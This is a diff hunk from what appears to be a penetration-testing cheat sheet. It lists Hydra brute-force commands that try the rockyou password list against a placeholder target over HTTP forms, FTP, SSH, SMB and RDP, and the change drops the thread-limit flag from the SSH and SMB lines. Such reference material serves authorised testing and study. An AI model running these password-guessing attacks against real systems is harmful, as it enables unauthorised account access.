@@ -52,9 +52,9 @@ $hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form
 
 $hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP ftp
 
-$hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP -t 4 ssh
+$hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP ssh
 
-$hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP -t 4 smb
+$hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP smb
 
 $hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP rdp
 
